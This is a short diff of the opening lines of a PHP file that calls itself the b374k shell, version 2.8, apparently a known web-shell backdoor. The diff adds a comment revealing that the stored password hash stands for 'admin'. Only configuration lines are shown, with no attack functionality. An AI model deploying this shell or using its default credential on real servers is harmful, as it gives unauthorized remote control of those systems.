@@ -1,6 +1,6 @@
 <?php
 
-$s_pass = "90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad";
+$s_pass = "90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad"; // password : admin
 
 $s_ver = "2.8"; // shell ver
 $s_title = "b374k ".$s_ver; // shell title
